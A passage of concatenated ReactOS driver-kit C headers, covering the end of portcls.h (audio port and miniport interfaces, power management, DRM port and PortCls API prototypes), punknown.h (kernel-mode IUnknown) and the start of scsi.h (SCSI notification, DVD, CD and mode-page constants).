    STDMETHODIMP_(VOID) FreeAudioBuffer\
    (\
        IN  PMDL                    AudioBufferMdl,\
        IN  ULONG                   BufferSize\
    );\
    STDMETHODIMP_(VOID) GetHWLatency\
    (\
        OUT KSRTAUDIO_HWLATENCY     *hwLatency\
    );\
    STDMETHODIMP_(NTSTATUS) GetPositionRegister\
    (\
        OUT KSRTAUDIO_HWREGISTER    *Register\
    );\
    STDMETHODIMP_(NTSTATUS) GetClockRegister\
    (\
        OUT KSRTAUDIO_HWREGISTER    *Register\
    )


/* ===============================================================
    IMiniportWaveRTStreamNotification Interface
*/

#undef INTERFACE
#define INTERFACE IMiniportWaveRTStreamNotification

DEFINE_GUID(IID_IMiniportWaveRTStreamNotification, 0x23759128, 0x96f1, 0x423b, 0xab, 0x4d, 0x81, 0x63, 0x5b, 0xcf, 0x8c, 0xa1);

DECLARE_INTERFACE_(IMiniportWaveRTStreamNotification, IMiniportWaveRTStream)
{
    DEFINE_ABSTRACT_UNKNOWN()

    DEFINE_ABSTRACT_MINIPORTWAVERTSTREAM()

    STDMETHOD_(NTSTATUS,AllocateBufferWithNotification)
    (   THIS_
        IN      ULONG                   NotificationCount,
        IN      ULONG                   RequestedSize,
        OUT     PMDL                    *AudioBufferMdl,
        OUT     ULONG                   *ActualSize,
        OUT     ULONG                   *OffsetFromFirstPage,
        OUT     MEMORY_CACHING_TYPE     *CacheType
    )   PURE;

    STDMETHOD_(VOID,FreeBufferWithNotification)
    (   THIS_
        IN      PMDL            AudioBufferMdl,
        IN      ULONG           BufferSize
    )   PURE;

    STDMETHOD_(NTSTATUS,RegisterNotificationEvent)
    (   THIS_
        IN      PKEVENT         NotificationEvent
    )   PURE;

    STDMETHOD_(NTSTATUS,UnregisterNotificationEvent)
    (   THIS_
        IN      PKEVENT         NotificationEvent
    )   PURE;
};

/* ===============================================================
    IMiniportWaveRT Interface
*/

#undef INTERFACE
#define INTERFACE IMiniportWaveRT

DEFINE_GUID(IID_IMiniportWaveRT, 0xf9fc4d6, 0x6061, 0x4f3c, 0xb1, 0xfc, 0x7, 0x5e, 0x35, 0xf7, 0x96, 0xa);

DECLARE_INTERFACE_(IMiniportWaveRT, IMiniport)
{
    DEFINE_ABSTRACT_UNKNOWN()

    DEFINE_ABSTRACT_MINIPORT()

    STDMETHOD_(NTSTATUS,Init)
    (   THIS_
        IN      PUNKNOWN            UnknownAdapter,
        IN      PRESOURCELIST       ResourceList,
        IN      PPORTWAVERT             Port
    )   PURE;

    STDMETHOD_(NTSTATUS,NewStream)
    (   THIS_
        OUT     PMINIPORTWAVERTSTREAM *         Stream,
        IN      PPORTWAVERTSTREAM               PortStream,
        IN      ULONG                       Pin,
        IN      BOOLEAN                     Capture,
        IN      PKSDATAFORMAT               DataFormat
    )   PURE;

    STDMETHOD_(NTSTATUS,GetDeviceDescription)
    (   THIS_
        OUT     PDEVICE_DESCRIPTION     DeviceDescription
    )   PURE;
};

typedef IMiniportWaveRT *PMINIPORTWAVERT;

#define IMP_IMiniportWaveRT\
    IMP_IMiniport;\
    STDMETHODIMP_(NTSTATUS) Init\
    (   IN      PUNKNOWN            UnknownAdapter,\
        IN      PRESOURCELIST       ResourceList,\
        IN      PPORTWAVERT             Port\
    );\
    STDMETHODIMP_(NTSTATUS) NewStream\
    (   OUT     PMINIPORTWAVERTSTREAM *         Stream,\
        IN      PPORTWAVERTSTREAM               PortStream,\
        IN      ULONG                       Pin,\
        IN      BOOLEAN                     Capture,\
        IN      PKSDATAFORMAT               DataFormat\
    );\
    STDMETHODIMP_(NTSTATUS) GetDeviceDescription\
    (   OUT     PDEVICE_DESCRIPTION     DeviceDescription\
    )

#endif

/* ===============================================================
    IAdapterPowerManagement Interface
*/

#undef INTERFACE
#define INTERFACE IAdapterPowerManagement

DEFINE_GUID(IID_IAdapterPowerManagement, 0x793417D0L, 0x35FE, 0x11D1, 0xAD, 0x08, 0x00, 0xA0, 0xC9, 0x0A, 0xB1, 0xB0);

DECLARE_INTERFACE_(IAdapterPowerManagement, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(void,PowerChangeState)(THIS_
        IN POWER_STATE NewState) PURE;

    STDMETHOD_(NTSTATUS,QueryPowerChangeState)(THIS_
        IN POWER_STATE NewStateQuery) PURE;

    STDMETHOD_(NTSTATUS,QueryDeviceCapabilities)(THIS_
        IN PDEVICE_CAPABILITIES PowerDeviceCaps) PURE;
};

#define IMP_IAdapterPowerManagement                       \
    STDMETHODIMP_(void) PowerChangeState                  \
    (   IN      POWER_STATE     NewState                  \
    );                                                    \
    STDMETHODIMP_(NTSTATUS) QueryPowerChangeState         \
    (   IN      POWER_STATE     NewStateQuery             \
    );                                                    \
    STDMETHODIMP_(NTSTATUS) QueryDeviceCapabilities       \
    (   IN      PDEVICE_CAPABILITIES    PowerDeviceCaps   \
    )

typedef IAdapterPowerManagement *PADAPTERPOWERMANAGEMENT;


/* ===============================================================
    IPowerNotify Interface
*/

#undef INTERFACE
#define INTERFACE IPowerNotify

DEFINE_GUID(IID_IPowerNotify, 0x3DD648B8L, 0x969F, 0x11D1, 0x95, 0xA9, 0x00, 0xC0, 0x4F, 0xB9, 0x25, 0xD3);

DECLARE_INTERFACE_(IPowerNotify, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(void, PowerChangeNotify)(THIS_
        IN POWER_STATE PowerState)PURE;
};

typedef IPowerNotify *PPOWERNOTIFY;

#undef INTERFACE

/* ===============================================================
    IPinCount Interface
*/
#if (NTDDI_VERSION >= NTDDI_WINXP)

#undef INTERFACE
#define INTERFACE IPinCount

DEFINE_GUID(IID_IPinCount, 0x5dadb7dcL, 0xa2cb, 0x4540, 0xa4, 0xa8, 0x42, 0x5e, 0xe4, 0xae, 0x90, 0x51);

DECLARE_INTERFACE_(IPinCount, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(void,PinCount)(THIS_
        IN ULONG PinId,
        IN OUT PULONG FilterNecessary,
        IN OUT PULONG FilterCurrent,
        IN OUT PULONG FilterPossible,
        IN OUT PULONG GlobalCurrent,
        IN OUT PULONG GlobalPossible) PURE;
};
typedef IPinCount *PPINCOUNT;

#undef INTERFACE
#endif


/* ===============================================================
    IPortEvents Interface
*/

#undef INTERFACE
#define INTERFACE IPortEvents

DEFINE_GUID(IID_IPortEvents, 0xA80F29C4L, 0x5498, 0x11D2, 0x95, 0xD9, 0x00, 0xC0, 0x4F, 0xB9, 0x25, 0xD3);
DECLARE_INTERFACE_(IPortEvents, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(void,AddEventToEventList)(THIS_
        IN  PKSEVENT_ENTRY EventEntry)PURE;

    STDMETHOD_(void,GenerateEventList)(THIS_
        IN  GUID* Set OPTIONAL,
        IN  ULONG EventId,
        IN  BOOL  PinEvent,
        IN  ULONG PinId,
        IN  BOOL  NodeEvent,
        IN  ULONG NodeId)PURE;
};

typedef IPortEvents *PPORTEVENTS;


#define IMP_IPortEvents                        \
    STDMETHODIMP_(void) AddEventToEventList(   \
        IN  PKSEVENT_ENTRY EventEntry);        \
                                               \
    STDMETHODIMP_(void) GenerateEventList(     \
        IN  GUID* Set OPTIONAL,                \
        IN  ULONG EventId,                     \
        IN  BOOL  PinEvent,                    \
        IN  ULONG PinId,                       \
        IN  BOOL  NodeEvent,                   \
        IN  ULONG NodeId)

/* ===============================================================
    IDrmPort / IDrmPort2 Interfaces
    These are almost identical, except for the addition of two extra methods.
*/

#undef INTERFACE
#define INTERFACE IDrmPort

#if (NTDDI_VERSION >= NTDDI_WINXP)
DEFINE_GUID(IID_IDrmPort, 0x286D3DF8L, 0xCA22, 0x4E2E, 0xB9, 0xBC, 0x20, 0xB4, 0xF0, 0xE2, 0x01, 0xCE);
#endif

#define DEFINE_ABSTRACT_DRMPORT()                          \
    STDMETHOD_(NTSTATUS,CreateContentMixed)(THIS_          \
        IN  PULONG paContentId,                            \
        IN  ULONG cContentId,                              \
        OUT PULONG pMixedContentId)PURE;                   \
                                                           \
    STDMETHOD_(NTSTATUS,DestroyContent)(THIS_              \
        IN ULONG ContentId)PURE;                           \
                                                           \
    STDMETHOD_(NTSTATUS,ForwardContentToFileObject)(THIS_  \
        IN ULONG        ContentId,                         \
        IN PFILE_OBJECT FileObject)PURE;                   \
                                                           \
    STDMETHOD_(NTSTATUS,ForwardContentToInterface)(THIS_   \
        IN ULONG ContentId,                                \
        IN PUNKNOWN pUnknown,                              \
        IN ULONG NumMethods)PURE;                          \
                                                           \
    STDMETHOD_(NTSTATUS,GetContentRights)(THIS_            \
        IN  ULONG ContentId,                               \
        OUT PDRMRIGHTS  DrmRights)PURE;

DECLARE_INTERFACE_(IDrmPort, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_DRMPORT()
};

typedef IDrmPort *PDRMPORT;

#define IMP_IDrmPort                                       \
    STDMETHODIMP_(NTSTATUS) CreateContentMixed(            \
        IN  PULONG paContentId,                            \
        IN  ULONG cContentId,                              \
        OUT PULONG pMixedContentId);                       \
                                                           \
    STDMETHODIMP_(NTSTATUS) DestroyContent(                \
        IN ULONG ContentId);                               \
                                                           \
    STDMETHODIMP_(NTSTATUS) ForwardContentToFileObject(    \
        IN ULONG        ContentId,                         \
        IN PFILE_OBJECT FileObject);                       \
                                                           \
    STDMETHODIMP_(NTSTATUS) ForwardContentToInterface(     \
        IN ULONG ContentId,                                \
        IN PUNKNOWN pUnknown,                              \
        IN ULONG NumMethods);                              \
                                                           \
    STDMETHODIMP_(NTSTATUS) GetContentRights(              \
        IN  ULONG ContentId,                               \
        OUT PDRMRIGHTS  DrmRights)


/* ===============================================================
    IDrmPort2 Interface
*/

#undef INTERFACE
#define INTERFACE IDrmPort2

#if (NTDDI_VERSION >= NTDDI_WINXP)
DEFINE_GUID(IID_IDrmPort2, 0x1ACCE59CL, 0x7311, 0x4B6B, 0x9F, 0xBA, 0xCC, 0x3B, 0xA5, 0x9A, 0xCD, 0xCE);
#endif

DECLARE_INTERFACE_(IDrmPort2, IDrmPort)
{
    DEFINE_ABSTRACT_UNKNOWN()
    DEFINE_ABSTRACT_DRMPORT()

    STDMETHOD_(NTSTATUS,AddContentHandlers)(THIS_
        IN ULONG ContentId,
        IN PVOID * paHandlers,
        IN ULONG NumHandlers)PURE;

    STDMETHOD_(NTSTATUS,ForwardContentToDeviceObject)(THIS_
        IN ULONG ContentId,
        IN PVOID Reserved,
        IN PCDRMFORWARD DrmForward)PURE;
};

typedef IDrmPort2 *PDRMPORT2;

#define IMP_IDrmPort2                                                \
    IMP_IDrmPort;                                                    \
    STDMETHODIMP_(NTSTATUS) AddContentHandlers(                      \
        IN ULONG ContentId,                                          \
        IN PVOID * paHandlers,                                       \
        IN ULONG NumHandlers);                                       \
                                                                     \
    STDMETHODIMP_(NTSTATUS) ForwardContentToDeviceObject(            \
        IN ULONG ContentId,                                          \
        IN PVOID Reserved,                                           \
        IN PCDRMFORWARD DrmForward)


/* ===============================================================
    IPortClsVersion Interface
*/
#undef INTERFACE
#define INTERFACE IPortClsVersion

#if (NTDDI_VERSION >= NTDDI_WINXP)
DEFINE_GUID(IID_IPortClsVersion, 0x7D89A7BBL, 0x869B, 0x4567, 0x8D, 0xBE, 0x1E, 0x16, 0x8C, 0xC8, 0x53, 0xDE);
#endif

DECLARE_INTERFACE_(IPortClsVersion, IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(DWORD, GetVersion)(THIS) PURE;
};

#define IMP_IPortClsVersion \
    STDMETHODIMP_(DWORD) GetVersion(void);

typedef IPortClsVersion *PPORTCLSVERSION;

#undef INTERFACE

/* ===============================================================
    IDmaOperations Interface
*/

/* ===============================================================
    IPreFetchOffset Interface
*/



/* ===============================================================
    PortCls API Functions
*/

typedef NTSTATUS (NTAPI *PCPFNSTARTDEVICE)(
    IN  PDEVICE_OBJECT DeviceObject,
    IN  PIRP Irp,
    IN  PRESOURCELIST ResourceList);

/* This is in NTDDK.H */
/*
typedef NTSTATUS (*PDRIVER_ADD_DEVICE)(
    IN struct _DRIVER_OBJECT* DriverObject,
    IN struct _DEVICE_OBJECT* PhysicalDeviceObject);
*/

PORTCLASSAPI NTSTATUS NTAPI
PcAddAdapterDevice(
    IN  PDRIVER_OBJECT DriverObject,
    IN  PDEVICE_OBJECT PhysicalDeviceObject,
    IN  PCPFNSTARTDEVICE StartDevice,
    IN  ULONG MaxObjects,
    IN  ULONG DeviceExtensionSize);

PORTCLASSAPI NTSTATUS NTAPI
PcInitializeAdapterDriver(
    IN  PDRIVER_OBJECT DriverObject,
    IN  PUNICODE_STRING RegistryPathName,
    IN  PDRIVER_ADD_DEVICE AddDevice);


/* ===============================================================
    Factories (TODO: Move elsewhere)
*/

PORTCLASSAPI NTSTATUS NTAPI
PcNewDmaChannel(
    OUT PDMACHANNEL* OutDmaChannel,
    IN  PUNKNOWN OuterUnknown OPTIONAL,
    IN  POOL_TYPE PoolType,
    IN  PDEVICE_DESCRIPTION DeviceDescription,
    IN  PDEVICE_OBJECT DeviceObject);

PORTCLASSAPI NTSTATUS NTAPI
PcNewInterruptSync(
    OUT PINTERRUPTSYNC* OUtInterruptSync,
    IN  PUNKNOWN OuterUnknown OPTIONAL,
    IN  PRESOURCELIST ResourceList,
    IN  ULONG ResourceIndex,
    IN  INTERRUPTSYNCMODE Mode);

PORTCLASSAPI NTSTATUS NTAPI
PcNewMiniport(
    OUT PMINIPORT* OutMiniport,
    IN  REFCLSID ClassId);

PORTCLASSAPI NTSTATUS NTAPI
PcNewPort(
    OUT PPORT* OutPort,
    IN  REFCLSID ClassId);

PORTCLASSAPI NTSTATUS NTAPI
PcNewRegistryKey(
    OUT PREGISTRYKEY* OutRegistryKey,
    IN  PUNKNOWN OuterUnknown OPTIONAL,
    IN  ULONG RegistryKeyType,
    IN  ACCESS_MASK DesiredAccess,
    IN  PVOID DeviceObject OPTIONAL,
    IN  PVOID SubDevice OPTIONAL,
    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN  ULONG CreateOptions OPTIONAL,
    OUT PULONG Disposition OPTIONAL);

PORTCLASSAPI NTSTATUS NTAPI
PcNewResourceList(
    OUT PRESOURCELIST* OutResourceList,
    IN  PUNKNOWN OuterUnknown OPTIONAL,
    IN  POOL_TYPE PoolType,
    IN  PCM_RESOURCE_LIST TranslatedResources,
    IN  PCM_RESOURCE_LIST UntranslatedResources);

PORTCLASSAPI NTSTATUS NTAPI
PcNewResourceSublist(
    OUT PRESOURCELIST* OutResourceList,
    IN  PUNKNOWN OuterUnknown OPTIONAL,
    IN  POOL_TYPE PoolType,
    IN  PRESOURCELIST ParentList,
    IN  ULONG MaximumEntries);

PORTCLASSAPI NTSTATUS NTAPI
PcNewServiceGroup(
    OUT PSERVICEGROUP* OutServiceGroup,
    IN  PUNKNOWN OuterUnknown OPTIONAL);


/* ===============================================================
    IRP Handling
*/

PORTCLASSAPI NTSTATUS NTAPI
PcDispatchIrp(
    IN  PDEVICE_OBJECT DeviceObject,
    IN  PIRP Irp);

PORTCLASSAPI NTSTATUS NTAPI
PcCompleteIrp(
    IN  PDEVICE_OBJECT DeviceObject,
    IN  PIRP Irp,
    IN  NTSTATUS Status);

PORTCLASSAPI NTSTATUS NTAPI
PcForwardIrpSynchronous(
    IN  PDEVICE_OBJECT DeviceObject,
    IN  PIRP Irp);


/* ===============================================================
    Power Management
*/

PORTCLASSAPI NTSTATUS NTAPI
PcRegisterAdapterPowerManagement(
    IN  PUNKNOWN pUnknown,
    IN  PVOID pvContext1);

PORTCLASSAPI NTSTATUS NTAPI
PcRequestNewPowerState(
    IN  PDEVICE_OBJECT pDeviceObject,
    IN  DEVICE_POWER_STATE RequestedNewState);


/* ===============================================================
    Properties
*/

PORTCLASSAPI NTSTATUS NTAPI
PcGetDeviceProperty(
    IN  PVOID DeviceObject,
    IN  DEVICE_REGISTRY_PROPERTY DeviceProperty,
    IN  ULONG BufferLength,
    OUT PVOID PropertyBuffer,
    OUT PULONG ResultLength);

PORTCLASSAPI NTSTATUS NTAPI
PcCompletePendingPropertyRequest(
    IN  PPCPROPERTY_REQUEST PropertyRequest,
    IN  NTSTATUS NtStatus);


/* ===============================================================
    I/O Timeouts
*/

PORTCLASSAPI NTSTATUS NTAPI
PcRegisterIoTimeout(
    IN  PDEVICE_OBJECT pDeviceObject,
    IN  PIO_TIMER_ROUTINE pTimerRoutine,
    IN  PVOID pContext);

PORTCLASSAPI NTSTATUS NTAPI
PcUnregisterIoTimeout(
    IN  PDEVICE_OBJECT pDeviceObject,
    IN  PIO_TIMER_ROUTINE pTimerRoutine,
    IN  PVOID pContext);


/* ===============================================================
    Physical Connections
*/

PORTCLASSAPI NTSTATUS NTAPI
PcRegisterPhysicalConnection(
    IN  PDEVICE_OBJECT DeviceObject,
    IN  PUNKNOWN FromUnknown,
    IN  ULONG FromPin,
    IN  PUNKNOWN ToUnknown,
    IN  ULONG ToPin);

PORTCLASSAPI NTSTATUS NTAPI
PcRegisterPhysicalConnectionFromExternal(
    IN  PDEVICE_OBJECT DeviceObject,
    IN  PUNICODE_STRING FromString,
    IN  ULONG FromPin,
    IN  PUNKNOWN ToUnknown,
    IN  ULONG ToPin);

PORTCLASSAPI NTSTATUS NTAPI
PcRegisterPhysicalConnectionToExternal(
    IN  PDEVICE_OBJECT DeviceObject,
    IN  PUNKNOWN FromUnknown,
    IN  ULONG FromPin,
    IN  PUNICODE_STRING ToString,
    IN  ULONG ToPin);


/* ===============================================================
    Misc
*/

PORTCLASSAPI ULONGLONG NTAPI
PcGetTimeInterval(
    IN  ULONGLONG Since);

PORTCLASSAPI NTSTATUS NTAPI
PcRegisterSubdevice(
    IN  PDEVICE_OBJECT DeviceObject,
    IN  PWCHAR Name,
    IN  PUNKNOWN Unknown);


/* ===============================================================
    Digital Rights Management Functions
    Implemented in XP and above
*/

PORTCLASSAPI NTSTATUS NTAPI
PcAddContentHandlers(
    IN  ULONG ContentId,
    IN  PVOID *paHandlers,
    IN  ULONG NumHandlers);

PORTCLASSAPI NTSTATUS NTAPI
PcCreateContentMixed(
    IN  PULONG paContentId,
    IN  ULONG cContentId,
    OUT PULONG pMixedContentId);

PORTCLASSAPI NTSTATUS NTAPI
PcDestroyContent(
    IN  ULONG ContentId);

PORTCLASSAPI NTSTATUS NTAPI
PcForwardContentToDeviceObject(
    IN  ULONG ContentId,
    IN  PVOID Reserved,
    IN  PCDRMFORWARD DrmForward);

PORTCLASSAPI NTSTATUS NTAPI
PcForwardContentToFileObject(
    IN  ULONG ContentId,
    IN  PFILE_OBJECT FileObject);

PORTCLASSAPI NTSTATUS NTAPI
PcForwardContentToInterface(
    IN  ULONG ContentId,
    IN  PUNKNOWN pUnknown,
    IN  ULONG NumMethods);

PORTCLASSAPI NTSTATUS NTAPI
PcGetContentRights(
    IN  ULONG ContentId,
    OUT PDRMRIGHTS DrmRights);


#endif /* PORTCLS_H */


```

`include/ddk/punknown.h`:

```h
/*
    ReactOS Kernel-Mode COM
    by Andrew Greenwood

    This file is in the public domain.
*/

#ifndef _UNKNOWN_H_
#define _UNKNOWN_H_

#ifdef __cplusplus
extern "C" {
#include <wdm.h>
}
#else
#include <wdm.h>
#endif

#include <windef.h>
#define COM_NO_WINDOWS_H
#include <basetyps.h>

#ifdef PUT_GUIDS_HERE
#include <initguid.h>
#endif


/* ===============================================================
    IUnknown
*/

#ifndef __IUnknown_INTERFACE_DEFINED__
#define __IUnknown_INTERFACE_DEFINED__
DEFINE_GUID(
    IID_IUnknown,
    0x00000000, 0x0000, 0x0000, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x46);

#undef INTERFACE
#define INTERFACE IUnknown

DECLARE_INTERFACE(IUnknown)
{
    STDMETHOD_(NTSTATUS, QueryInterface)( THIS_
        IN  REFIID,
        OUT PVOID*)
    PURE;

    STDMETHOD_(ULONG, AddRef)( THIS )
    PURE;

    STDMETHOD_(ULONG, Release)( THIS )
    PURE;
};
#endif

#undef INTERFACE

typedef IUnknown *PUNKNOWN;


/* ===============================================================
    IUnknown definition
    Boilerplate code macro for use in subclassed interfaces
*/

#define DEFINE_ABSTRACT_UNKNOWN() \
    STDMETHOD_(NTSTATUS, QueryInterface)( THIS_ \
        REFIID InterfaceId, \
        PVOID* Interface) \
    PURE; \
\
    STDMETHOD_(ULONG, AddRef)(THIS) \
    PURE; \
\
    STDMETHOD_(ULONG, Release)(THIS) \
    PURE;


/* ===============================================================
    Constructor callback definition
*/

typedef HRESULT (NTAPI *PFNCREATEINSTANCE)(
    OUT PUNKNOWN* Unknown,
    IN  REFCLSID ClassId,
    IN  PUNKNOWN OuterUnknown,
    IN  POOL_TYPE PoolType);

#endif /* _UNKNOWN_H_ */


```

`include/ddk/scsi.h`:

```h
/*
 * scsi.h
 *
 * SCSI port and class interface.
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef _NTSCSI_
#define _NTSCSI_

#ifdef __cplusplus
extern "C" {
#endif

#ifndef _NTSCSI_USER_MODE_
#include "srb.h"
#endif

#define NOTIFICATION_OPERATIONAL_CHANGE_CLASS_MASK    0x02
#define NOTIFICATION_POWER_MANAGEMENT_CLASS_MASK      0x04
#define NOTIFICATION_EXTERNAL_REQUEST_CLASS_MASK      0x08
#define NOTIFICATION_MEDIA_STATUS_CLASS_MASK          0x10
#define NOTIFICATION_MULTI_HOST_CLASS_MASK            0x20
#define NOTIFICATION_DEVICE_BUSY_CLASS_MASK           0x40


#define NOTIFICATION_NO_CLASS_EVENTS                  0x0
#define NOTIFICATION_OPERATIONAL_CHANGE_CLASS_EVENTS  0x1
#define NOTIFICATION_POWER_MANAGEMENT_CLASS_EVENTS    0x2
#define NOTIFICATION_EXTERNAL_REQUEST_CLASS_EVENTS    0x3
#define NOTIFICATION_MEDIA_STATUS_CLASS_EVENTS        0x4
#define NOTIFICATION_MULTI_HOST_CLASS_EVENTS          0x5
#define NOTIFICATION_DEVICE_BUSY_CLASS_EVENTS         0x6

#define NOTIFICATION_OPERATIONAL_EVENT_NO_CHANGE         0x0
#define NOTIFICATION_OPERATIONAL_EVENT_CHANGE_REQUESTED  0x1
#define NOTIFICATION_OPERATIONAL_EVENT_CHANGE_OCCURRED   0x2

#define NOTIFICATION_OPERATIONAL_STATUS_AVAILABLE        0x0
#define NOTIFICATION_OPERATIONAL_STATUS_TEMPORARY_BUSY   0x1
#define NOTIFICATION_OPERATIONAL_STATUS_EXTENDED_BUSY    0x2

#define NOTIFICATION_OPERATIONAL_OPCODE_NONE             0x0
#define NOTIFICATION_OPERATIONAL_OPCODE_FEATURE_CHANGE   0x1
#define NOTIFICATION_OPERATIONAL_OPCODE_FEATURE_ADDED    0x2
#define NOTIFICATION_OPERATIONAL_OPCODE_UNIT_RESET       0x3
#define NOTIFICATION_OPERATIONAL_OPCODE_FIRMWARE_CHANGED 0x4
#define NOTIFICATION_OPERATIONAL_OPCODE_INQUIRY_CHANGED  0x5

#define NOTIFICATION_POWER_EVENT_NO_CHANGE          0x0
#define NOTIFICATION_POWER_EVENT_CHANGE_SUCCEEDED   0x1
#define NOTIFICATION_POWER_EVENT_CHANGE_FAILED      0x2

#define NOTIFICATION_POWER_STATUS_ACTIVE            0x1
#define NOTIFICATION_POWER_STATUS_IDLE              0x2
#define NOTIFICATION_POWER_STATUS_STANDBY           0x3
#define NOTIFICATION_POWER_STATUS_SLEEP             0x4

#define NOTIFICATION_MEDIA_EVENT_NO_EVENT           0x0
#define NOTIFICATION_EXTERNAL_EVENT_NO_CHANGE       0x0
#define NOTIFICATION_EXTERNAL_EVENT_BUTTON_DOWN     0x1
#define NOTIFICATION_EXTERNAL_EVENT_BUTTON_UP       0x2
#define NOTIFICATION_EXTERNAL_EVENT_EXTERNAL        0x3

#define NOTIFICATION_EXTERNAL_STATUS_READY          0x0
#define NOTIFICATION_EXTERNAL_STATUS_PREVENT        0x1

#define NOTIFICATION_EXTERNAL_REQUEST_NONE          0x0000
#define NOTIFICATION_EXTERNAL_REQUEST_QUEUE_OVERRUN 0x0001
#define NOTIFICATION_EXTERNAL_REQUEST_PLAY          0x0101
#define NOTIFICATION_EXTERNAL_REQUEST_REWIND_BACK   0x0102
#define NOTIFICATION_EXTERNAL_REQUEST_FAST_FORWARD  0x0103
#define NOTIFICATION_EXTERNAL_REQUEST_PAUSE         0x0104
#define NOTIFICATION_EXTERNAL_REQUEST_STOP          0x0106
#define NOTIFICATION_EXTERNAL_REQUEST_ASCII_LOW     0x0200
#define NOTIFICATION_EXTERNAL_REQUEST_ASCII_HIGH    0x02ff

#define NOTIFICATION_MEDIA_EVENT_NO_CHANGE          0x0
#define NOTIFICATION_MEDIA_EVENT_EJECT_REQUEST      0x1
#define NOTIFICATION_MEDIA_EVENT_NEW_MEDIA          0x2
#define NOTIFICATION_MEDIA_EVENT_MEDIA_REMOVAL      0x3
#define NOTIFICATION_MEDIA_EVENT_MEDIA_CHANGE       0x4

#define NOTIFICATION_BUSY_EVENT_NO_EVENT               0x0
#define NOTIFICATION_MULTI_HOST_EVENT_NO_CHANGE        0x0
#define NOTIFICATION_MULTI_HOST_EVENT_CONTROL_REQUEST  0x1
#define NOTIFICATION_MULTI_HOST_EVENT_CONTROL_GRANT    0x2
#define NOTIFICATION_MULTI_HOST_EVENT_CONTROL_RELEASE  0x3

#define NOTIFICATION_MULTI_HOST_STATUS_READY           0x0
#define NOTIFICATION_MULTI_HOST_STATUS_PREVENT         0x1

#define NOTIFICATION_MULTI_HOST_PRIORITY_NO_REQUESTS   0x0
#define NOTIFICATION_MULTI_HOST_PRIORITY_LOW           0x1
#define NOTIFICATION_MULTI_HOST_PRIORITY_MEDIUM        0x2
#define NOTIFICATION_MULTI_HOST_PRIORITY_HIGH          0x3

#define NOTIFICATION_BUSY_EVENT_NO_EVENT            0x0
#define NOTIFICATION_BUSY_EVENT_NO_CHANGE           0x0
#define NOTIFICATION_BUSY_EVENT_BUSY                0x1
#define NOTIFICATION_BUSY_EVENT_LO_CHANGE           0x2

#define NOTIFICATION_BUSY_STATUS_NO_EVENT           0x0
#define NOTIFICATION_BUSY_STATUS_POWER              0x1
#define NOTIFICATION_BUSY_STATUS_IMMEDIATE          0x2
#define NOTIFICATION_BUSY_STATUS_DEFERRED           0x3

#define SECURITY_PROTOCOL_IEEE1667  0xEE

#define DVD_FORMAT_LEAD_IN          0x00
#define DVD_FORMAT_COPYRIGHT        0x01
#define DVD_FORMAT_DISK_KEY         0x02
#define DVD_FORMAT_BCA              0x03
#define DVD_FORMAT_MANUFACTURING    0x04

#define DVD_REPORT_AGID            0x00
#define DVD_CHALLENGE_KEY          0x01
#define DVD_KEY_1                  0x02
#define DVD_KEY_2                  0x03
#define DVD_TITLE_KEY              0x04
#define DVD_REPORT_ASF             0x05
#define DVD_INVALIDATE_AGID        0x3F

#define BLANK_FULL              0x0
#define BLANK_MINIMAL           0x1
#define BLANK_TRACK             0x2
#define BLANK_UNRESERVE_TRACK   0x3
#define BLANK_TAIL              0x4
#define BLANK_UNCLOSE_SESSION   0x5
#define BLANK_SESSION           0x6

#define CD_EXPECTED_SECTOR_ANY          0x0
#define CD_EXPECTED_SECTOR_CDDA         0x1
#define CD_EXPECTED_SECTOR_MODE1        0x2
#define CD_EXPECTED_SECTOR_MODE2        0x3
#define CD_EXPECTED_SECTOR_MODE2_FORM1  0x4
#define CD_EXPECTED_SECTOR_MODE2_FORM2  0x5

#define DISK_STATUS_EMPTY       0x00
#define DISK_STATUS_INCOMPLETE  0x01
#define DISK_STATUS_COMPLETE    0x02
#define DISK_STATUS_OTHERS      0x03

#define LAST_SESSION_EMPTY              0x00
#define LAST_SESSION_INCOMPLETE         0x01
#define LAST_SESSION_RESERVED_DAMAGED   0x02
#define LAST_SESSION_COMPLETE           0x03

#define DISK_TYPE_CDDA          0x00
#define DISK_TYPE_CDI           0x10
#define DISK_TYPE_XA            0x20
#define DISK_TYPE_UNDEFINED     0xFF

#define DISC_BGFORMAT_STATE_NONE        0x0
#define DISC_BGFORMAT_STATE_INCOMPLETE  0x1
#define DISC_BGFORMAT_STATE_RUNNING     0x2
#define DISC_BGFORMAT_STATE_COMPLETE    0x3

#define DATA_BLOCK_MODE0    0x0
#define DATA_BLOCK_MODE1    0x1
#define DATA_BLOCK_MODE2    0x2

/* READ_TOC formats */
#define READ_TOC_FORMAT_TOC         0x00
#define READ_TOC_FORMAT_SESSION     0x01
#define READ_TOC_FORMAT_FULL_TOC    0x02
#define READ_TOC_FORMAT_PMA         0x03
#define READ_TOC_FORMAT_ATIP        0x04

#define CDB6GENERIC_LENGTH                   6
#define CDB10GENERIC_LENGTH                  10
#define CDB12GENERIC_LENGTH                  12

#define SETBITON                             1
#define SETBITOFF                            0

/* Mode Sense/Select page constants */
#define MODE_PAGE_VENDOR_SPECIFIC       0x00
#define MODE_PAGE_ERROR_RECOVERY        0x01
#define MODE_PAGE_DISCONNECT            0x02
#define MODE_PAGE_FORMAT_DEVICE         0x03
#define MODE_PAGE_MRW                   0x03
#define MODE_PAGE_RIGID_GEOMETRY        0x04
#define MODE_PAGE_FLEXIBILE             0x05
